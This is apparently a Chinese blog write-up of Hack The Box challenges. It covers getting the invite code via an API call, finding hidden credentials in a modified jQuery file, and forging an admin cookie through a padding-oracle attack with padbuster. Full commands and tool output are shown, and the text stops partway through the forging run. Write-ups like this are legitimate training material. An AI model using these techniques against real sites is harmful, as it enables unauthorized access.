<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>hack the box邀请码获取和web challenge · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">hack the box邀请码获取和web challenge</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2019-05-03</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="tutorial ctf"> tutorial ctf</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h1 id="hack-the-box邀请码获取和web-challenge"><a href="#hack-the-box邀请码获取和web-challenge" class="headerlink" title="hack the box邀请码获取和web challenge"></a>hack the box邀请码获取和web challenge</h1><h2 id="hack-the-box邀请码获取"><a href="#hack-the-box邀请码获取" class="headerlink" title="hack the box邀请码获取"></a>hack the box邀请码获取</h2><p>在invite code页面输入，<code>makeInvitecode</code>，显示：<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ƒ makeInviteCode()&#123;$.ajax(&#123;<span class="built_in">type</span>:<span class="string">"POST"</span>,dataType:<span class="string">"json"</span>,url:<span class="string">'/api/invite/how/to/generate'</span>,success:<span class="function"><span class="keyword">function</span><span class="params">(response)</span></span>&#123;console.<span class="built_in">log</span>(response)&#125;,<span class="built_in">error</span>:<span class="function"><span class="keyword">function</span><span class="params">(response)</span></span>&#123;console.<span class="built_in">log</span>(response)&#125;&#125;)&#125;</span><br></pre></td></tr></table></figure></p>
<p>于是输入<code>makeInviteCode()</code>，得到：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attribute">0</span>: <span class="number">200</span>, <span class="attribute">success</span>: <span class="number">1</span>, <span class="attribute">data</span>: &#123;…&#125;&#125;</span><br><span class="line"><span class="attribute">0</span>: <span class="number">200</span></span><br><span class="line"><span class="attribute">data</span>:</span><br><span class="line"><span class="attribute">data</span>: <span class="string">"&lt;mysecret&gt;"</span></span><br><span class="line"><span class="attribute">enctype</span>: <span class="string">"BASE64"</span></span><br><span class="line"><span class="attribute">__proto__</span>: Object</span><br><span class="line"><span class="attribute">success</span>: <span class="number">1</span></span><br><span class="line"><span class="attribute">__proto__</span>: Object</span><br></pre></td></tr></table></figure></p>
<p>base64解码：</p>
<blockquote>
<p>In order to generate the invite code, make a POST request to /api/invite/generate</p>
</blockquote>
<p>利用curl协议：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v https:<span class="regexp">//</span>www.hackthebox.eu<span class="regexp">/api/i</span>nvite<span class="regexp">/generate -XPOST</span></span><br></pre></td></tr></table></figure></p>
<p>成功得到，然后将其base64解码</p>
<h2 id="web-challenge"><a href="#web-challenge" class="headerlink" title="web challenge"></a>web challenge</h2><h3 id="HDC"><a href="#HDC" class="headerlink" title="HDC"></a>HDC</h3><p>我傻了，看请求，爆目录，都无果，最后注意到引用的jquery-3.2.1似乎有问题，利用<a href="http://www.matools.com/compare" target="_blank" rel="noopener">代码比对</a>，发现多了一块，再多出的这块代码开头发现：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">function doProcess() </span><br><span class="line">&#123;<span class="keyword">var</span> <span class="keyword">form</span>=document.createElement(<span class="string">"form"</span>);	<span class="keyword">form</span>.setAttribute(<span class="string">"method"</span>,<span class="string">"post"</span>);	<span class="keyword">form</span>.setAttribute(<span class="string">"action"</span>,<span class="string">"main/index.php"</span>);	<span class="keyword">form</span>.setAttribute(<span class="string">"target"</span>,<span class="string">"view"</span>);	<span class="keyword">var</span> hiddenField=document.createElement(<span class="string">"input"</span>);	hiddenField.setAttribute(<span class="string">"type"</span>,<span class="string">"hidden"</span>);	hiddenField.setAttribute(<span class="string">"name"</span>,<span class="string">"name1"</span>);	hiddenField.setAttribute(<span class="string">"value"</span>,<span class="string">"TXlMaXR0bGU"</span>);	<span class="keyword">var</span> hiddenField2=document.createElement(<span class="string">"input"</span>);	hiddenField2.setAttribute(<span class="string">"type"</span>,<span class="string">"hidden"</span>);	hiddenField2.setAttribute(<span class="string">"name"</span>,<span class="string">"name2"</span>);	hiddenField2.setAttribute(<span class="string">"value"</span>,<span class="string">"cDB3bmll"</span>);	<span class="keyword">form</span>.appendChild(hiddenField2);		<span class="keyword">form</span>.appendChild(hiddenField);	<span class="keyword">form</span>.appendChild(hiddenField2);	document.body.appendChild(<span class="keyword">form</span>);			<span class="keyword">window</span>.<span class="keyword">open</span>('','<span class="keyword">view</span>');	<span class="keyword">form</span>.submit();&#125;</span><br></pre></td></tr></table></figure></p>
<p>有两个值：<code>TXlMaXR0bGU</code>，<code>cDB3bmll</code>，成功登入<br>界面如下：<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190644-17ffa23a-bbfc-1.png" alt=""><br>在mailbox发现了一个检索框但无法点击，检查元素，发现了图片地址<strong>./_secret<em>area</em>/mails.gif</strong>，于是尝试进入<strong>_secret<em>area</em></strong>目录，找到了邮箱：</p>
<blockquote>
<h2 id="All-good-boys-are-here…-hehehehehehe"><a href="#All-good-boys-are-here…-hehehehehehe" class="headerlink" title="All good boys are here… hehehehehehe!"></a>All good boys are here… hehehehehehe!</h2><p>Peter Punk CallMePink@newmail.com<br>Nabuchodonosor BabyNavou@mailpost.gr<br>Ilias Magkakos imagkakos@badmail.com<br>Nick Pipshow NickTheGreek@mail.tr.gr<br>Don Quixote Windmill@mail.gr<br>Crazy Priest SeVaftise@hotmail.com<br>Fishroe Salad fishroesalad@mail.com<br>TaPanta Ola OlaMaziLeme@mail.gr<br>Laertis George I8aki@mail.gr<br>Thiseas Sparrow Pirates@mail.gr<br>Black Dreamer SupaHacka@mail.com<br>Callme Daddy FuckthemALL@mail.com<br>Aggeliki Lykolouli FwsStoTounel@Traino.pourxetai<br>Kompinadoros Yannnnis YannisWith4N@rolf.com<br>Serafino Titamola Ombrax@mail.gr<br>Joe Hard Soft@Butter.gr<br>Bond James MyNameIsBond@JamesBond.com<br>Endof Text EndOfLine@mail.com</p>
</blockquote>
<p>再回看题目要求：</p>
<blockquote>
<p>Can you find out who that is and send him an email to check</p>
</blockquote>
<p>所以挨个发送请求，用intruder<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180919190721-2e3fb954-bbfc-1.png" alt=""></p>
<h3 id="I-know-Mag1k"><a href="#I-know-Mag1k" class="headerlink" title="I know Mag1k"></a>I know Mag1k</h3><blockquote>
<p>Can you get to the profile page of the admin?</p>
</blockquote>
<p>不像sql注入，也没有限定admin，利用admin用户名注册一个人账户发现没有什么东西<br><img src="https://i.imgur.com/OoVd8ib.png" alt=""></p>
<p>这时关注cookie，有一个可疑字段：</p>
<blockquote>
<p>iknowmag1k:82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D</p>
</blockquote>
<p>查询一番，发现是<a href="https://wenku.baidu.com/view/6dd0cacdda38376baf1faeb4.html" target="_blank" rel="noopener">padding Oracle</a><br>，准备在另一篇文章详解<br>可以利用padbuster，在kali上自带，可能是网络的原因，也可能是垃圾电脑的原因，跑了很久：<br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:42414/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D 8 --cookie <span class="string">"iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3"</span></span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.3.3                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line"><span class="comment">[+]</span> Status: 200</span><br><span class="line"><span class="comment">[+]</span> Location: N/A</span><br><span class="line"><span class="comment">[+]</span> Content Length: 3844</span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Decrypt Mode</span><br><span class="line">*** Starting Block 1 <span class="keyword">of</span> 4 ***</span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">1	1	200	3844	N/A</span><br><span class="line">2 **	255	500	2203	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** <span class="keyword">is</span> recommended : 2</span><br><span class="line"></span><br><span class="line">Continuing test with selection 2</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Success: (63/256) <span class="comment">[Byte 8]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (150/256) <span class="comment">[Byte 7]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (129/256) <span class="comment">[Byte 6]</span></span><br><span class="line">ERROR: No matching response on <span class="comment">[Byte 5]</span></span><br><span class="line">       Automatically trying one more time...</span><br><span class="line"><span class="comment">[+]</span> Success: (223/256) <span class="comment">[Byte 8]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (10/256) <span class="comment">[Byte 7]</span></span><br><span class="line">ERROR: No matching response on <span class="comment">[Byte 6]</span></span><br><span class="line">Do you want to start this block over? (Yes/No)? <span class="comment">[y/n/a]</span> : y</span><br><span class="line">INFO: Switching to interactive mode</span><br><span class="line"><span class="comment">[+]</span> Success: (63/256) <span class="comment">[Byte 8]</span></span><br><span class="line">Do you want to use this value (Yes/No/All)? <span class="comment">[y/n/a]</span> : y</span><br><span class="line"><span class="comment">[+]</span> Success: (150/256) <span class="comment">[Byte 7]</span></span><br><span class="line">Do you want to use this value (Yes/No/All)? <span class="comment">[y/n/a]</span> : a</span><br><span class="line"><span class="comment">[+]</span> Success: (225/256) <span class="comment">[Byte 6]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (154/256) <span class="comment">[Byte 5]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (57/256) <span class="comment">[Byte 4]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (140/256) <span class="comment">[Byte 3]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (185/256) <span class="comment">[Byte 2]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (128/256) <span class="comment">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block 1 Results:</span><br><span class="line"><span class="comment">[+]</span> Cipher Text (HEX): 5ff96bda9a25d7f9</span><br><span class="line"><span class="comment">[+]</span> Intermediate Bytes (HEX): 884072c2621c68c0</span><br><span class="line"><span class="comment">[+]</span> Plain Text: &#123;<span class="string">"user"</span>:</span><br><span class="line"></span><br><span class="line">Use <span class="keyword">of</span> uninitialized value $plainTextBytes in concatenation (.) or string at /usr/bin/padbuster line 361, &lt;STDIN&gt; line 4.</span><br><span class="line">*** Starting Block 2 <span class="keyword">of</span> 4 ***</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Success: (44/256) <span class="comment">[Byte 8]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (9/256) <span class="comment">[Byte 7]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (184/256) <span class="comment">[Byte 6]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (9/256) <span class="comment">[Byte 5]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (78/256) <span class="comment">[Byte 4]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (247/256) <span class="comment">[Byte 3]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (97/256) <span class="comment">[Byte 2]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (139/256) <span class="comment">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block 2 Results:</span><br><span class="line"><span class="comment">[+]</span> Cipher Text (HEX): 054ef73b3398cc72</span><br><span class="line"><span class="comment">[+]</span> Intermediate Bytes (HEX): 7d980fb7f34bf5d5</span><br><span class="line"><span class="comment">[+]</span> Plain Text: <span class="string">"admin"</span>,</span><br><span class="line"></span><br><span class="line">*** Starting Block 3 <span class="keyword">of</span> 4 ***</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Success: (175/256) <span class="comment">[Byte 8]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (12/256) <span class="comment">[Byte 7]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (71/256) <span class="comment">[Byte 6]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (174/256) <span class="comment">[Byte 5]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (174/256) <span class="comment">[Byte 4]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (98/256) <span class="comment">[Byte 3]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (197/256) <span class="comment">[Byte 2]</span></span><br><span class="line"><span class="comment">[+]</span> Success: (209/256) <span class="comment">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block 3 Results:</span><br><span class="line"><span class="comment">[+]</span> Cipher Text (HEX): 97a1379951adf98c</span><br><span class="line"><span class="comment">[+]</span> Intermediate Bytes (HEX): 273c985756baf650</span><br><span class="line"><span class="comment">[+]</span> Plain Text: <span class="string">"role"</span>:<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*** Starting Block 4 of 4 ***</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (113/256) <span class="subst">[Byte 8]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (7/256) <span class="subst">[Byte 7]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (45/256) <span class="subst">[Byte 6]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (137/256) <span class="subst">[Byte 5]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (18/256) <span class="subst">[Byte 4]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (172/256) <span class="subst">[Byte 3]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (43/256) <span class="subst">[Byte 2]</span></span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Success: (22/256) <span class="subst">[Byte 1]</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Block 4 Results:</span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Cipher Text (HEX): 41d12ce36fc3308e</span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Intermediate Bytes (HEX): e2d252eb73d0fb8e</span></span><br><span class="line"><span class="string"><span class="subst">[+]</span> Plain Text: user"</span>&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">** Finished ***</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Decrypted value (ASCII): &#123;<span class="string">"user"</span>:<span class="string">"admin"</span>,<span class="string">"role"</span>:<span class="string">"user"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Decrypted value (HEX): 7B2275736572223A2261646D696E222C22726F6C65223A2275736572227D0202</span><br><span class="line"></span><br><span class="line"><span class="comment">[+]</span> Decrypted value (Base64): eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoidXNlciJ9AgI=</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br></pre></td></tr></table></figure></p>
<p>所以将<strong>role</strong>改为<strong>admin</strong><br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# padbuster http://docker.hackthebox.eu:<span class="number">42414</span>/profile.php 82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D <span class="number">8</span> --cookie <span class="string">"iknowmag1k=82IHsQduSvpf%2BWvamiXX%2BQVO9zszmMxyl6E3mVGt%2BYxB0Szjb8Mwjg%3D%3D;PHPSESSID=qevph0jf0hlskfkr0atq1kj1b3"</span> -plaintext <span class="string">"&#123;\"</span>user\<span class="string">":\"</span>admin\<span class="string">",\"</span>role\<span class="string">":\"</span>admin\<span class="string">"&#125;"</span></span><br><span class="line"></span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| PadBuster - v0.<span class="number">3</span>.<span class="number">3</span>                        |</span><br><span class="line">| Brian Holyfield - Gotham Digital Science  |</span><br><span class="line">| labs@gdssecurity.com                      |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line"></span><br><span class="line">INFO: The original request returned the following</span><br><span class="line"><span class="string">[+]</span> Status: <span class="number">200</span></span><br><span class="line"><span class="string">[+]</span> Location: N/A</span><br><span class="line"><span class="string">[+]</span> Content Length: <span class="number">3844</span></span><br><span class="line"></span><br><span class="line">INFO: Starting PadBuster Encrypt Mode</span><br><span class="line"><span class="string">[+]</span> Number of Blocks: <span class="number">4</span></span><br><span class="line"></span><br><span class="line">INFO: No error string was provided...starting response analysis</span><br><span class="line"></span><br><span class="line">*** Response Analysis Complete ***</span><br><span class="line"></span><br><span class="line">The following response signatures were returned:</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------</span><br><span class="line">ID#	Freq	Status	Length	Location</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"><span class="number">1</span>	<span class="number">1</span>	<span class="number">200</span>	<span class="number">3844</span>	N/A</span><br><span class="line"><span class="number">2</span> **	<span class="number">255</span>	<span class="number">500</span>	<span class="number">2203</span>	N/A</span><br><span class="line">-------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Enter an ID that matches the error condition</span><br><span class="line">NOTE: The ID# marked with ** is recommended : <span class="number">2</span></span><br><span class="line"></span><br><span class="line">Continuing test with selection <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">97</span>/<span class="number">256</span>) <span class="string">[Byte 8]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">155</span>/<span class="number">256</span>) <span class="string">[Byte 7]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">87</span>/<span class="number">256</span>) <span class="string">[Byte 6]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">153</span>/<span class="number">256</span>) <span class="string">[Byte 5]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">61</span>/<span class="number">256</span>) <span class="string">[Byte 4]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">188</span>/<span class="number">256</span>) <span class="string">[Byte 3]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">151</span>/<span class="number">256</span>) <span class="string">[Byte 2]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">167</span>/<span class="number">256</span>) <span class="string">[Byte 1]</span></span><br><span class="line"></span><br><span class="line">Block <span class="number">4</span> Results:</span><br><span class="line"><span class="string">[+]</span> New Cipher Text (HEX): 300a2faf0d881a9f</span><br><span class="line"><span class="string">[+]</span> Intermediate Bytes (HEX): 516e42c663aa679e</span><br><span class="line"></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">197</span>/<span class="number">256</span>) <span class="string">[Byte 8]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">77</span>/<span class="number">256</span>) <span class="string">[Byte 7]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">51</span>/<span class="number">256</span>) <span class="string">[Byte 6]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">253</span>/<span class="number">256</span>) <span class="string">[Byte 5]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">25</span>/<span class="number">256</span>) <span class="string">[Byte 4]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">182</span>/<span class="number">256</span>) <span class="string">[Byte 3]</span></span><br><span class="line"><span class="string">[+]</span> Success: (<span class="number">226</span>/<span 